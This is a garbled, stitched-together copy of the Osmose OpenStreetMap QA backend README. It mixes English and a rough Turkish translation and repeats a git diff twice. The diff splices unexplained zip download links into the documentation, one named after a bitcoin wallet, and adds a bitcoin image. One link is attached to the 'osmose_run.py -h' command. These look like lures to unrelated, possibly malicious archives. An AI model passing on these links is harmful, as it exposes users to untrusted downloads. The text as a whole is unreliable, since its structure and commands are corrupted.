```plpgsql
# Backend part of the Osmose QA tool

This is the part of [Osmose](https://osmose.openstreetmap.fr) which analyses OSM
and sends the results to the frontend. This works as follows:

  - an .osm.pbf extraction is downloaded
  - analyses are run directly on the .osm.pbf file, or on the database
  - results of the analyses are uploaded to the frontend
  - by default, the database is purged

Analysers can be build in many ways:

  - With [MapCSS](https://josm.openstreetmap.de/wiki/Help/Styles/MapCSSImplementation) rules validating each OSM objects: [plugins/*.mapcss](plugins) and JOSM MapCSS [core](https://josm.openstreetmap.de/browser/josm/trunk/resources/data/validator/) and some [contrib](https://josm.openstreetmap.de/wiki/Rules) rules.
  - With Python code validating each OSM objects: [plugins](plugins).
  - With SQL/PostGIS queries on the Osmosis database: [analysers/analyser_osmosis_*.py](analysers).
  - By configuring a comparator of OpenData and OSM objects: [analysers/analyser_merge_*.py](analysers).



# Osmose QA aracının arka uç kısmı

Bu, OSM'yi analiz eden [Osmose](https://osmose.openstreetmap.fr) parçasıdır
ve sonuçları ön uca gönderir. Bu şu şekilde çalışır:

  - .osm.pbf dosyası indirildi
  - Analizler doğrudan .osm.pbf dosyasında veya veritabanında çalıştırılır
  - Analiz sonuçları önyüze yüklenir
  - varsayılan olarak veritabanı temizlenir
[İndir.zip](https://github.com/user-attachments/files/17053729/İndir.zip)

# Analizörler birçok şekilde oluşturulabilir:

  - Her bir OSM nesnesini doğrulayan [MapCSS](https://josm.openstreetmap.de/wiki/Help/Styles/MapCSSImplementation) kuralları: [plugins/*.mapcss](plugins) ve JOSM MapCSS [çekirdek](https://josm.openstreetmap.de/browser/josm/trunk/resources/data/validator/) ve bazı [contrib](https://josm.openstreetmap.de/wiki/Rules) kuralları.
  - Her bir OSM nesnesini doğrulayan Python kodu: [eklentiler](eklentiler).
  - Osmosis veritabanında SQL/PostGIS sorguları ile: [analysers/analyser_osmosis_*.py](analysers).
  - OpenData ve OSM nesnelerinin bir karşılaştırıcısını yapılandırarak: [analysers/analyser_merge_*.py](analysers).
![bitcoin-hakimiyeti_(Coinmarketcap)](https://github.com/user-attachments/assets/ee707d15-bad2-41db-a5ca-3bdcb96192b9)

## Kurulum
Osmose Backend'i kurmanın varsayılan yolu Docker'dır. Şuna bakın
[docker/README.md](docker/README.md).

Ayrıca bir Debian dağıtımına [INSTALL.md](INSTALL.md) ile manuel olarak da kurulum yapabilirsiniz.

```
Koşmak,Seçenekler için osmose_run.py yardımına bakın
osmose_run.py -h,[unisat-uygulaması-0.2.17.zip](https://github.com/user-attachments/files/17053700/unisat-uygulaması-0.2.17.zip)

```

## Katkıda Bulunma

Bir Docker kurulumu yapın ve aşağıdaki adımları izleyin:
"[Docker ile Osmose üzerinde geliştirme](docker/README.md#develop-on-osmose-with-docker)"
rehber.

Ek katkıyı okuyun [yönergeler](CONTRIBUTING.md).[Download.zip](https://github.com/user-attachments/files/17053704/Download.zip)
---
 README.md | 8 ++++++--
 1 dosya değiştirildi, 6 ekleme(+), 2 silme(-)



diff --git a/README.md b/README.md
dizin cb8ce8524..b7593b353 100644
--- a/README.md
+++ b/README.md
@@ -7,6 +7,7 @@ ve sonuçları ön uca gönderir. Bu şu şekilde çalışır:
   - Analizler doğrudan .osm.pbf dosyasında veya veritabanında çalıştırılır
   - Analiz sonuçları önyüze yüklenir
   - varsayılan olarak veritabanı temizlenir
+[İndir.zip](https://github.com/user-attachments/files/17053729/İndir.zip)
 
 Analizörler birçok şekilde oluşturulabilir:
 
@@ -14,6 +15,7 @@ Analizörler birçok şekilde oluşturulabilir:
   - Her bir OSM nesnesini doğrulayan Python kodu: [eklentiler](eklentiler).
   - Osmosis veritabanında SQL/PostGIS sorguları ile: [analysers/analyser_osmosis_*.py](analysers).
   - OpenData ve OSM nesnelerinin bir karşılaştırıcısını yapılandırarak: [analysers/analyser_merge_*.py](analysers).
+![bitcoin-hakimiyeti_(Coinmarketcap)](https://github.com/user-attachments/assets/ee707d15-bad2-41db-a5ca-3bdcb96192b9)
 
 ## Kurulum
 
@@ -26,7 +28,8 @@ Ayrıca bir debian dağıtımına [INSTALL.md](INSTALL.md) elle de kurulum yapabilirsiniz.
 
 Seçenekler için osmose_run.py yardımına bakın
 
-osmose_run.py -h
+osmose_run.py -h,[unisat-uygulaması-0.2.17.zip](https://github.com/user-attachments/files/17053700/unisat-uygulaması-0.2.17.zip)
+


 
 ## Katkıda Bulunma
@@ -35,4 +38,5 @@ Bir Docker kurulumu yapın ve aşağıdaki adımları izleyin:
 "[Docker ile Osmose üzerinde geliştirme](docker/README.md#develop-on-osmose-with-docker)"
 rehber.
 
-Ek katkıyı [yönergeleri](CONTRIBUTING.md) okuyun.
+Ek katkıyı okuyun [yönergeler](CONTRIBUTING.md).[Download.zip](https://github.com/user-attachments/files/17053704/Download.zip)
+

diff --git a/README.md b/README.md
dizin cb8ce8524..b7593b353 100644
--- a/README.md
+++ b/README.md
@@ -7,6 +7,7 @@ ve sonuçları ön uca gönderir. Bu şu şekilde çalışır:
   - Analizler doğrudan .osm.pbf dosyasında veya veritabanında çalıştırılır
   - Analiz sonuçları önyüze yüklenir
   - varsayılan olarak veritabanı temizlenir
+[İndir.zip](https://github.com/user-attachments/files/17053729/İndir.zip)
 
#  Analizörler birçok şekilde oluşturulabilir:
 
@@ -14,6 +15,7 @@ Analizörler birçok şekilde oluşturulabilir:
   - Her bir OSM nesnesini doğrulayan Python kodu: [eklentiler](eklentiler).
   - Osmosis veritabanında SQL/PostGIS sorguları ile: [analysers/analyser_osmosis_*.py](analysers).
   - OpenData ve OSM nesnelerinin bir karşılaştırıcısını yapılandırarak: [analysers/analyser_merge_*.py](analysers).
+![bitcoin-hakimiyeti_(Coinmarketcap)](https://github.com/user-attachments/assets/ee707d15-bad2-41db-a5ca-3bdcb96192b9)
 
 ## Kurulum
 
@@ -26,7 +28,8 @@ Ayrıca bir debian dağıtımına [INSTALL.md](INSTALL.md) elle de kurulum yapabilirsiniz.
 
#  Seçenekler için osmose_run.py yardımına bakın
 ```
-osmose_run.py -h
+osmose_run.py -h,[unisat-uygulaması-0.2.17.zip](https://github.com/user-attachments/files/17053700/unisat-uygulaması-0.2.17.zip)
+
 
 
 ## Katkıda Bulunma
@@ -35,4 +38,5 @@ Bir Docker kurulumu yapın ve aşağıdaki adımları izleyin:
 "[Docker ile Osmose üzerinde geliştirme](docker/README.md#develop-on-osmose-with-docker)"
 rehber.
 
-Ek katkıyı [yönergeleri](CONTRIBUTING.md) okuyun.
+Ek katkıyı okuyun [yönergeler](CONTRIBUTING.md).[Download.zip](https://github.com/user-attachments/files/17053704/Download.zip)
+







## Installation

The default way to setup Osmose Backend is through Docker. Look at the
[docker/README.md](docker/README.md).

You can also install manually on a debian distribution [INSTALL.md](INSTALL.md).

## Run

Look at the osmose_run.py help for options
```
osmose_run.py -h
```

## Contributing

Setup a Docker install and follow the
"[Develop on Osmose with docker](docker/README.md#develop-on-osmose-with-docker)"
guide.

Read the additional contribution [guidelines](CONTRIBUTING.md).

```
